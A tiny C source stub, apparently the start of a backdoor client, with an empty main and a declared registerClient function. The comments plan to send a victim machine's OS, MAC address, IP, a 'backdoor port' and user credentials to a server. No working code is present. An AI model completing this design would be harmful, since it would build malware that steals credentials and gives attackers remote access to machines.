#include <stdio.h>

#define UUID_LEN 37

char client_uuid[UUID_LEN];

//Register to the server
//Connect to the server and send client information (json) like: Windows/Linux, version, manufactorer, mac address, ip and backdoor port, user and password if not too hard...
//Get the uuid from the server and store it for later use.
int registerClient(char* ip, int port);

int main(){
	
}